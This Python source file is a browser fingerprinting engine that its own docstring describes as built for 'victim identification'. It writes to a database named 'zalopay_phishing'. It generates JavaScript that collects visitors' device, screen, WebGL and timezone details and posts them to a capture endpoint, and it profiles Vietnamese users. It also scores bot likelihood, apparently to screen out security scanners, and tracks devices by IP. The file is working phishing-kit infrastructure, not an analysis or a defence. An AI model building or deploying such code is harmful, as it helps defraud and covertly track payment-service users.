"""
Device Fingerprinting Engine
Advanced browser and device fingerprinting for victim identification
"""

import os
import json
import base64
import secrets
import hashlib
import time
import math
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import re
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class FingerprintConfig:
    """Fingerprinting configuration"""

    def __init__(self):
        self.fingerprint_timeout = int(os.getenv("FINGERPRINT_TIMEOUT", "300"))  # 5 minutes
        self.max_fingerprints_per_ip = int(os.getenv("MAX_FINGERPRINTS_PER_IP", "10"))
        self.enable_canvas_fingerprinting = os.getenv("ENABLE_CANVAS_FINGERPRINTING", "true").lower() == "true"
        self.enable_webrtc_fingerprinting = os.getenv("ENABLE_WEBRTC_FINGERPRINTING", "true").lower() == "true"
        self.enable_font_fingerprinting = os.getenv("ENABLE_FONT_FINGERPRINTING", "true").lower() == "true"
        self.enable_audio_fingerprinting = os.getenv("ENABLE_AUDIO_FINGERPRINTING", "true").lower() == "true"
        self.consistency_threshold = float(os.getenv("CONSISTENCY_THRESHOLD", "0.85"))  # 85% similarity

class BrowserFingerprint:
    """Browser fingerprint data container"""

    def __init__(self, fingerprint_id: str = None):
        self.fingerprint_id = fingerprint_id or secrets.token_hex(16)
        self.created_at = datetime.now(timezone.utc)

        # Basic browser info
        self.user_agent = None
        self.language = None
        self.platform = None
        self.cookie_enabled = None
        self.online_status = None

        # Screen and viewport
        self.screen_width = None
        self.screen_height = None
        self.screen_depth = None
        self.viewport_width = None
        self.viewport_height = None
        self.device_pixel_ratio = None

        # Hardware info
        self.hardware_concurrency = None
        self.device_memory = None
        self.max_touch_points = None

        # Browser features
        self.plugins = []
        self.mime_types = []
        self.fonts = []
        self.canvas_fingerprint = None
        self.webrtc_fingerprint = None
        self.audio_fingerprint = None

        # Timezone and locale
        self.timezone = None
        self.timezone_offset = None

        # WebGL info
        self.webgl_vendor = None
        self.webgl_renderer = None

        # Storage and permissions
        self.local_storage_available = None
        self.session_storage_available = None
        self.indexed_db_available = None
        self.geolocation_available = None
        self.notification_available = None

        # Network info
        self.ip_address = None
        self.connection_type = None

    def update_from_request(self, fingerprint_data: Dict[str, Any], ip_address: str = None):
        """Update fingerprint from request data"""
        try:
            # Basic browser info
            self.user_agent = fingerprint_data.get("userAgent")
            self.language = fingerprint_data.get("language")
            self.platform = fingerprint_data.get("platform")
            self.cookie_enabled = fingerprint_data.get("cookieEnabled")
            self.online_status = fingerprint_data.get("onLine")

            # Screen info
            screen = fingerprint_data.get("screen", {})
            self.screen_width = screen.get("width")
            self.screen_height = screen.get("height")
            self.screen_depth = screen.get("colorDepth")
            self.device_pixel_ratio = screen.get("devicePixelRatio")

            # Viewport info
            viewport = fingerprint_data.get("viewport", {})
            self.viewport_width = viewport.get("width")
            self.viewport_height = viewport.get("height")

            # Hardware info
            hardware = fingerprint_data.get("hardware", {})
            self.hardware_concurrency = hardware.get("hardwareConcurrency")
            self.device_memory = hardware.get("deviceMemory")
            self.max_touch_points = hardware.get("maxTouchPoints")

            # Browser features
            self.plugins = fingerprint_data.get("plugins", [])
            self.mime_types = fingerprint_data.get("mimeTypes", [])
            self.fonts = fingerprint_data.get("fonts", [])

            # Advanced fingerprints
            self.canvas_fingerprint = fingerprint_data.get("canvasFingerprint")
            self.webrtc_fingerprint = fingerprint_data.get("webrtcFingerprint")
            self.audio_fingerprint = fingerprint_data.get("audioFingerprint")

            # Timezone info
            self.timezone = fingerprint_data.get("timezone")
            self.timezone_offset = fingerprint_data.get("timezoneOffset")

            # WebGL info
            webgl = fingerprint_data.get("webgl", {})
            self.webgl_vendor = webgl.get("vendor")
            self.webgl_renderer = webgl.get("renderer")

            # Storage and permissions
            storage = fingerprint_data.get("storage", {})
            self.local_storage_available = storage.get("localStorage")
            self.session_storage_available = storage.get("sessionStorage")
            self.indexed_db_available = storage.get("indexedDB")
            self.geolocation_available = storage.get("geolocation")
            self.notification_available = storage.get("notifications")

            # Network info
            self.ip_address = ip_address
            self.connection_type = fingerprint_data.get("connectionType")

        except Exception as e:
            logger.error(f"Error updating fingerprint from request: {e}")

    def generate_hash(self) -> str:
        """Generate fingerprint hash"""
        try:
            # Create fingerprint string from key components
            components = [
                self.user_agent or "",
                str(self.screen_width or 0),
                str(self.screen_height or 0),
                str(self.hardware_concurrency or 0),
                str(self.device_memory or 0),
                str(self.canvas_fingerprint or ""),
                str(self.webrtc_fingerprint or ""),
                str(self.webgl_vendor or ""),
                str(self.webgl_renderer or ""),
                str(self.timezone or ""),
                "|".join(sorted(self.fonts or [])),
                "|".join(sorted(self.plugins or []))
            ]

            fingerprint_string = "|".join(components)
            return hashlib.sha256(fingerprint_string.encode()).hexdigest()

        except Exception as e:
            logger.error(f"Error generating fingerprint hash: {e}")
            return secrets.token_hex(16)

    def calculate_similarity(self, other_fingerprint) -> float:
        """Calculate similarity with another fingerprint"""
        try:
            if not isinstance(other_fingerprint, BrowserFingerprint):
                return 0.0

            similarity_score = 0.0
            total_components = 0

            # Compare user agent
            if self.user_agent and other_fingerprint.user_agent:
                if self.user_agent == other_fingerprint.user_agent:
                    similarity_score += 1.0
                total_components += 1

            # Compare screen dimensions
            if self.screen_width and other_fingerprint.screen_width:
                if self.screen_width == other_fingerprint.screen_width:
                    similarity_score += 1.0
                total_components += 1

            if self.screen_height and other_fingerprint.screen_height:
                if self.screen_height == other_fingerprint.screen_height:
                    similarity_score += 1.0
                total_components += 1

            # Compare hardware concurrency
            if self.hardware_concurrency and other_fingerprint.hardware_concurrency:
                if self.hardware_concurrency == other_fingerprint.hardware_concurrency:
                    similarity_score += 1.0
                total_components += 1

            # Compare canvas fingerprint
            if self.canvas_fingerprint and other_fingerprint.canvas_fingerprint:
                if self.canvas_fingerprint == other_fingerprint.canvas_fingerprint:
                    similarity_score += 2.0  # Higher weight for canvas
                total_components += 1

            # Compare WebGL info
            if self.webgl_vendor and other_fingerprint.webgl_vendor:
                if self.webgl_vendor == other_fingerprint.webgl_vendor:
                    similarity_score += 1.0
                total_components += 1

            if self.webgl_renderer and other_fingerprint.webgl_renderer:
                if self.webgl_renderer == other_fingerprint.webgl_renderer:
                    similarity_score += 1.0
                total_components += 1

            # Compare fonts
            if self.fonts and other_fingerprint.fonts:
                common_fonts = set(self.fonts) & set(other_fingerprint.fonts)
                total_fonts = set(self.fonts) | set(other_fingerprint.fonts)
                if total_fonts:
                    font_similarity = len(common_fonts) / len(total_fonts)
                    similarity_score += font_similarity
                    total_components += 1

            # Compare plugins
            if self.plugins and other_fingerprint.plugins:
                common_plugins = set(self.plugins) & set(other_fingerprint.plugins)
                total_plugins = set(self.plugins) | set(other_fingerprint.plugins)
                if total_plugins:
                    plugin_similarity = len(common_plugins) / len(total_plugins)
                    similarity_score += plugin_similarity
                    total_components += 1

            return similarity_score / total_components if total_components > 0 else 0.0

        except Exception as e:
            logger.error(f"Error calculating similarity: {e}")
            return 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "fingerprint_id": self.fingerprint_id,
            "created_at": self.created_at.isoformat(),
            "user_agent": self.user_agent,
            "language": self.language,
            "platform": self.platform,
            "cookie_enabled": self.cookie_enabled,
            "online_status": self.online_status,
            "screen_width": self.screen_width,
            "screen_height": self.screen_height,
            "screen_depth": self.screen_depth,
            "viewport_width": self.viewport_width,
            "viewport_height": self.viewport_height,
            "device_pixel_ratio": self.device_pixel_ratio,
            "hardware_concurrency": self.hardware_concurrency,
            "device_memory": self.device_memory,
            "max_touch_points": self.max_touch_points,
            "plugins": self.plugins,
            "mime_types": self.mime_types,
            "fonts": self.fonts,
            "canvas_fingerprint": self.canvas_fingerprint,
            "webrtc_fingerprint": self.webrtc_fingerprint,
            "audio_fingerprint": self.audio_fingerprint,
            "timezone": self.timezone,
            "timezone_offset": self.timezone_offset,
            "webgl_vendor": self.webgl_vendor,
            "webgl_renderer": self.webgl_renderer,
            "local_storage_available": self.local_storage_available,
            "session_storage_available": self.session_storage_available,
            "indexed_db_available": self.indexed_db_available,
            "geolocation_available": self.geolocation_available,
            "notification_available": self.notification_available,
            "ip_address": self.ip_address,
            "connection_type": self.connection_type,
            "fingerprint_hash": self.generate_hash()
        }

class FingerprintDatabase:
    """Fingerprint database for tracking and comparison"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.fingerprints: Dict[str, BrowserFingerprint] = {}
        self.ip_fingerprints: Dict[str, List[str]] = {}  # IP -> fingerprint_ids

    def store_fingerprint(self, fingerprint: BrowserFingerprint) -> bool:
        """Store fingerprint in database"""
        try:
            fingerprint_hash = fingerprint.generate_hash()

            # Store in memory
            self.fingerprints[fingerprint.fingerprint_id] = fingerprint

            # Track by IP
            if fingerprint.ip_address:
                if fingerprint.ip_address not in self.ip_fingerprints:
                    self.ip_fingerprints[fingerprint.ip_address] = []
                self.ip_fingerprints[fingerprint.ip_address].append(fingerprint.fingerprint_id)

                # Limit fingerprints per IP
                if len(self.ip_fingerprints[fingerprint.ip_address]) > 10:
                    oldest_id = self.ip_fingerprints[fingerprint.ip_address].pop(0)
                    self.fingerprints.pop(oldest_id, None)

            # Store in MongoDB
            if self.mongodb:
                self._store_in_mongodb(fingerprint)

            # Store in Redis for quick lookup
            if self.redis:
                self._store_in_redis(fingerprint)

            return True

        except Exception as e:
            logger.error(f"Error storing fingerprint: {e}")
            return False

    def find_similar_fingerprints(self, fingerprint: BrowserFingerprint,
                                threshold: float = None) -> List[Tuple[BrowserFingerprint, float]]:
        """Find similar fingerprints"""
        try:
            if threshold is None:
                threshold = 0.85

            similar = []

            for fp in self.fingerprints.values():
                if fp.fingerprint_id == fingerprint.fingerprint_id:
                    continue

                similarity = fingerprint.calculate_similarity(fp)
                if similarity >= threshold:
                    similar.append((fp, similarity))

            # Sort by similarity (highest first)
            similar.sort(key=lambda x: x[1], reverse=True)

            return similar

        except Exception as e:
            logger.error(f"Error finding similar fingerprints: {e}")
            return []

    def get_fingerprint(self, fingerprint_id: str) -> Optional[BrowserFingerprint]:
        """Get fingerprint by ID"""
        return self.fingerprints.get(fingerprint_id)

    def get_ip_fingerprints(self, ip_address: str) -> List[BrowserFingerprint]:
        """Get all fingerprints for an IP address"""
        fingerprint_ids = self.ip_fingerprints.get(ip_address, [])
        return [self.fingerprints[fid] for fid in fingerprint_ids if fid in self.fingerprints]

    def _store_in_mongodb(self, fingerprint: BrowserFingerprint):
        """Store fingerprint in MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            fingerprints_collection = db.browser_fingerprints

            document = fingerprint.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(days=30)  # Keep for 30 days

            fingerprints_collection.replace_one(
                {"fingerprint_id": fingerprint.fingerprint_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing fingerprint in MongoDB: {e}")

    def _store_in_redis(self, fingerprint: BrowserFingerprint):
        """Store fingerprint in Redis"""
        try:
            if not self.redis:
                return

            key = f"fingerprint:{fingerprint.fingerprint_id}"
            data = json.dumps(fingerprint.to_dict())

            # Expire after 30 days
            self.redis.setex(key, 2592000, data)  # 30 days in seconds

        except Exception as e:
            logger.error(f"Error storing fingerprint in Redis: {e}")

class FingerprintEngine:
    """Main fingerprinting engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = FingerprintConfig()
        self.fingerprint_db = FingerprintDatabase(mongodb_connection, redis_client)

        # Load existing fingerprints
        self._load_existing_fingerprints()

    def _load_existing_fingerprints(self):
        """Load existing fingerprints from database"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            fingerprints_collection = db.browser_fingerprints

            # Load recent fingerprints (last 7 days)
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=7)
            cursor = fingerprints_collection.find({"created_at": {"$gte": cutoff_date.isoformat()}})

            count = 0
            for doc in cursor:
                try:
                    fingerprint = BrowserFingerprint(doc["fingerprint_id"])
                    # Restore data from document
                    for key, value in doc.items():
                        if hasattr(fingerprint, key) and key != "fingerprint_id":
                            setattr(fingerprint, key, value)

                    self.fingerprint_db.store_fingerprint(fingerprint)
                    count += 1

                except Exception as e:
                    logger.error(f"Error loading fingerprint {doc.get('fingerprint_id')}: {e}")

            logger.info(f"Loaded {count} existing fingerprints")

        except Exception as e:
            logger.error(f"Error loading existing fingerprints: {e}")

    def generate_fingerprint_script(self, session_id: str) -> str:
        """
        Generate JavaScript fingerprinting script

        Args:
            session_id: Session ID for tracking

        Returns:
            JavaScript code for fingerprinting
        """
        try:
            script = f"""
// Browser Fingerprinting Script
(function() {{
    'use strict';

    const sessionId = '{session_id}';
    const fingerprintData = {{}};

    // Basic browser info
    fingerprintData.userAgent = navigator.userAgent;
    fingerprintData.language = navigator.language;
    fingerprintData.platform = navigator.platform;
    fingerprintData.cookieEnabled = navigator.cookieEnabled;
    fingerprintData.onLine = navigator.onLine;

    // Screen info
    fingerprintData.screen = {{
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        devicePixelRatio: window.devicePixelRatio || 1
    }};

    // Viewport info
    fingerprintData.viewport = {{
        width: window.innerWidth,
        height: window.innerHeight
    }};

    // Hardware info
    fingerprintData.hardware = {{
        hardwareConcurrency: navigator.hardwareConcurrency || 0,
        deviceMemory: navigator.deviceMemory || 0,
        maxTouchPoints: navigator.maxTouchPoints || 0
    }};

    // Browser features
    fingerprintData.plugins = [];
    fingerprintData.mimeTypes = [];
    fingerprintData.fonts = [];

    // Storage availability
    fingerprintData.storage = {{
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB,
        geolocation: !!navigator.geolocation,
        notifications: 'Notification' in window
    }};

    // WebGL info
    try {{
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {{
            fingerprintData.webgl = {{
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER)
            }};
        }}
    }} catch (e) {{
        console.log('WebGL fingerprinting failed:', e);
    }}

    // Timezone info
    fingerprintData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fingerprintData.timezoneOffset = new Date().getTimezoneOffset();

    // Connection info
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {{
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        fingerprintData.connectionType = conn.effectiveType || 'unknown';
    }}

    // Send fingerprint data
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/capture/fingerprint/' + sessionId, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(fingerprintData));

}})();
"""

            return script.strip()

        except Exception as e:
            logger.error(f"Error generating fingerprint script: {e}")
            return ""

    def process_fingerprint_data(self, session_id: str, fingerprint_data: Dict[str, Any],
                               ip_address: str = None) -> Dict[str, Any]:
        """
        Process fingerprint data from client

        Args:
            session_id: Session ID
            fingerprint_data: Fingerprint data from client
            ip_address: Client IP address

        Returns:
            Processing result with fingerprint analysis
        """
        try:
            # Create fingerprint object
            fingerprint = BrowserFingerprint()
            fingerprint.update_from_request(fingerprint_data, ip_address)

            # Store fingerprint
            self.fingerprint_db.store_fingerprint(fingerprint)

            # Find similar fingerprints
            similar_fingerprints = self.fingerprint_db.find_similar_fingerprints(
                fingerprint,
                self.config.consistency_threshold
            )

            # Analyze fingerprint using advanced analyzer
            advanced_analysis = self._get_advanced_analysis(fingerprint_data)
            
            # Legacy analysis for backward compatibility
            legacy_analysis = self._analyze_fingerprint(fingerprint, similar_fingerprints)

            # Store analysis results
            result = {
                "success": True,
                "fingerprint_id": fingerprint.fingerprint_id,
                "fingerprint_hash": fingerprint.generate_hash(),
                "analysis": legacy_analysis,
                "advanced_analysis": advanced_analysis,
                "similar_fingerprints_count": len(similar_fingerprints),
                "is_consistent": legacy_analysis.get("consistency_score", 0) >= self.config.consistency_threshold,
                "risk_score": advanced_analysis.get("risk_assessment", {}).get("risk_score", 0),
                "bot_probability": advanced_analysis.get("bot_probability", 0),
                "confidence_score": advanced_analysis.get("confidence_score", 0)
            }

            # Store in MongoDB
            if self.mongodb:
                self._store_analysis_result(session_id, fingerprint, result)

            logger.info(f"Fingerprint processed: {fingerprint.fingerprint_id}")
            return result

        except Exception as e:
            logger.error(f"Error processing fingerprint data: {e}")
            return {"success": False, "error": "Failed to process fingerprint"}

    def _analyze_fingerprint(self, fingerprint: BrowserFingerprint,
                           similar_fingerprints: List[Tuple[BrowserFingerprint, float]]) -> Dict[str, Any]:
        """Analyze fingerprint for consistency and risk"""
        try:
            analysis = {
                "consistency_score": 0.0,
                "risk_score": 0.0,
                "uniqueness_score": 0.0,
                "bot_probability": 0.0,
                "issues": []
            }

            # Calculate consistency score based on similar fingerprints
            if similar_fingerprints:
                # Average similarity with similar fingerprints
                avg_similarity = sum(score for _, score in similar_fingerprints) / len(similar_fingerprints)
                analysis["consistency_score"] = avg_similarity

                # Higher consistency might indicate bot behavior
                if avg_similarity > 0.95:
                    analysis["bot_probability"] += 0.3
                    analysis["issues"].append("Very high consistency with other fingerprints")

            # Check for bot-like characteristics
            bot_indicators = 0

            # Missing user agent or generic user agent
            if not fingerprint.user_agent or fingerprint.user_agent in ["", "undefined"]:
                bot_indicators += 1
                analysis["issues"].append("Missing or empty user agent")

            # No plugins (common in headless browsers)
            if not fingerprint.plugins:
                bot_indicators += 1
                analysis["issues"].append("No browser plugins detected")

            # No WebGL support (common in some bots)
            if not fingerprint.webgl_vendor or not fingerprint.webgl_renderer:
                bot_indicators += 1
                analysis["issues"].append("No WebGL support")

            # Very small screen size
            if fingerprint.screen_width and fingerprint.screen_width < 800:
                bot_indicators += 0.5
                analysis["issues"].append("Unusually small screen width")

            # No touch points but mobile user agent
            if (fingerprint.user_agent and "mobile" in fingerprint.user_agent.lower()
                and fingerprint.max_touch_points == 0):
                bot_indicators += 0.5
                analysis["issues"].append("Mobile user agent but no touch support")

            # Calculate bot probability
            analysis["bot_probability"] += min(bot_indicators * 0.2, 0.8)

            # Calculate risk score (0-1, higher is more suspicious)
            analysis["risk_score"] = analysis["bot_probability"]

            # Calculate uniqueness score (how unique this fingerprint is)
            total_fingerprints = len(self.fingerprint_db.fingerprints)
            if total_fingerprints > 0:
                # More similar fingerprints = less unique
                similarity_penalty = len(similar_fingerprints) * 0.1
                analysis["uniqueness_score"] = max(0.0, 1.0 - similarity_penalty)

            return analysis

        except Exception as e:
            logger.error(f"Error analyzing fingerprint: {e}")
            return {
                "consistency_score": 0.0,
                "risk_score": 0.5,  # Default to medium risk
                "uniqueness_score": 0.5,
                "bot_probability": 0.5,
                "issues": ["Analysis error"]
            }

    def _store_analysis_result(self, session_id: str, fingerprint: BrowserFingerprint, result: Dict[str, Any]):
        """Store fingerprint analysis result"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            analysis_collection = db.fingerprint_analysis

            document = {
                "session_id": session_id,
                "fingerprint_id": fingerprint.fingerprint_id,
                "fingerprint_data": fingerprint.to_dict(),
                "analysis_result": result,
                "created_at": datetime.now(timezone.utc),
                "expires_at": datetime.now(timezone.utc) + timedelta(days=30)
            }

            analysis_collection.insert_one(document)

        except Exception as e:
            logger.error(f"Error storing analysis result: {e}")

    def get_fingerprint_analysis(self, fingerprint_id: str) -> Optional[Dict[str, Any]]:
        """Get fingerprint analysis"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            analysis_collection = db.fingerprint_analysis

            document = analysis_collection.find_one({"fingerprint_id": fingerprint_id})
            return document

        except Exception as e:
            logger.error(f"Error getting fingerprint analysis: {e}")
            return None

    def get_device_history(self, ip_address: str) -> List[Dict[str, Any]]:
        """Get device history for IP address"""
        try:
            fingerprints = self.fingerprint_db.get_ip_fingerprints(ip_address)

            history = []
            for fp in fingerprints:
                analysis = self.get_fingerprint_analysis(fp.fingerprint_id)

                history.append({
                    "fingerprint_id": fp.fingerprint_id,
                    "created_at": fp.created_at.isoformat(),
                    "user_agent": fp.user_agent,
                    "platform": fp.platform,
                    "screen_resolution": f"{fp.screen_width}x{fp.screen_height}" if fp.screen_width and fp.screen_height else None,
                    "risk_score": analysis.get("analysis_result", {}).get("risk_score", 0) if analysis else 0,
                    "bot_probability": analysis.get("analysis_result", {}).get("bot_probability", 0) if analysis else 0
                })

            # Sort by creation date (newest first)
            history.sort(key=lambda x: x["created_at"], reverse=True)

            return history

        except Exception as e:
            logger.error(f"Error getting device history: {e}")
            return []

    def health_check(self) -> bool:
        """Health check for fingerprint engine"""
        try:
            # Check if database connections are available
            if self.mongodb:
                try:
                    # Simple ping to check MongoDB connection
                    db = self.mongodb.get_database("zalopay_phishing")
                    db.command("ping")
                except Exception as e:
                    logger.error(f"MongoDB health check failed: {e}")
                    return False

            if self.redis:
                try:
                    # Simple ping to check Redis connection
                    self.redis.ping()
                except Exception as e:
                    logger.error(f"Redis health check failed: {e}")
                    return False

            # Check if fingerprint database is accessible
            if hasattr(self.fingerprint_db, 'fingerprints'):
                return True

            return True

        except Exception as e:
            logger.error(f"Fingerprint engine health check failed: {e}")
            return False

    def get_fingerprint_stats(self) -> Dict[str, Any]:
        """Get fingerprint statistics"""
        try:
            total_fingerprints = len(self.fingerprint_db.fingerprints)

            # Count fingerprints by risk level
            high_risk = 0
            medium_risk = 0
            low_risk = 0

            for fp in self.fingerprint_db.fingerprints.values():
                analysis = self.get_fingerprint_analysis(fp.fingerprint_id)
                if analysis and "analysis_result" in analysis:
                    risk_score = analysis["analysis_result"].get("risk_score", 0)
                    if risk_score >= 0.7:
                        high_risk += 1
                    elif risk_score >= 0.4:
                        medium_risk += 1
                    else:
                        low_risk += 1

            # Count unique IPs
            unique_ips = len(self.fingerprint_db.ip_fingerprints)

            # Get recent activity (last 24 hours)
            recent_count = 0
            cutoff_time = datetime.now(timezone.utc) - timedelta(hours=24)

            for fp in self.fingerprint_db.fingerprints.values():
                if fp.created_at >= cutoff_time:
                    recent_count += 1

            return {
                "total_fingerprints": total_fingerprints,
                "unique_ips": unique_ips,
                "recent_activity": recent_count,
                "risk_distribution": {
                    "high_risk": high_risk,
                    "medium_risk": medium_risk,
                    "low_risk": low_risk
                },
                "average_risk_score": (high_risk * 0.8 + medium_risk * 0.5 + low_risk * 0.2) / total_fingerprints if total_fingerprints > 0 else 0
            }

        except Exception as e:
            logger.error(f"Error getting fingerprint stats: {e}")
            return {
                "total_fingerprints": 0,
                "unique_ips": 0,
                "recent_activity": 0,
                "risk_distribution": {
                    "high_risk": 0,
                    "medium_risk": 0,
                    "low_risk": 0
                },
                "average_risk_score": 0
            }
    
    def _get_advanced_analysis(self, fingerprint_data: Dict[str, Any]) -> Dict[str, Any]:
        """Get advanced fingerprint analysis"""
        try:
            # Import here to avoid circular imports
            from engines.validation.fingerprint_analyzer import get_fingerprint_analyzer
            
            analyzer = get_fingerprint_analyzer()
            return analyzer.analyze_fingerprint(fingerprint_data)
            
        except Exception as e:
            logger.error(f"Error getting advanced analysis: {e}")
            return {
                'device_detection': {'device_type': 'Unknown', 'confidence': 0.0},
                'vietnamese_profile_match': {'is_vietnamese_profile': False, 'match_score': 0.0},
                'risk_assessment': {'risk_score': 0.5, 'risk_level': 'MEDIUM'},
                'confidence_score': 0.5
            }

# Global fingerprint engine instance
fingerprint_engine = None

def initialize_fingerprint_engine(mongodb_connection=None, redis_client=None) -> FingerprintEngine:
    """Initialize global fingerprint engine"""
    global fingerprint_engine
    fingerprint_engine = FingerprintEngine(mongodb_connection, redis_client)
    
    # Initialize advanced analyzer
    try:
        from engines.validation.fingerprint_analyzer import initialize_fingerprint_analyzer
        initialize_fingerprint_analyzer()
        logger.info("Advanced fingerprint analyzer initialized")
    except Exception as e:
        logger.error(f"Error initializing advanced analyzer: {e}")
    
    return fingerprint_engine

def get_fingerprint_engine() -> FingerprintEngine:
    """Get global fingerprint engine"""
    if fingerprint_engine is None:
        raise ValueError("Fingerprint engine not initialized")
    return fingerprint_engine

# Convenience functions
def generate_fingerprint_script(session_id: str) -> str:
    """Generate fingerprint script (global convenience function)"""
    return get_fingerprint_engine().generate_fingerprint_script(session_id)

def process_fingerprint_data(session_id: str, fingerprint_data: Dict[str, Any], ip_address: str = None) -> Dict[str, Any]:
    """Process fingerprint data (global convenience function)"""
    return get_fingerprint_engine().process_fingerprint_data(session_id, fingerprint_data, ip_address)

def get_device_history(ip_address: str) -> List[Dict[str, Any]]:
    """Get device history (global convenience function)"""
    return get_fingerprint_engine().get_device_history(ip_address)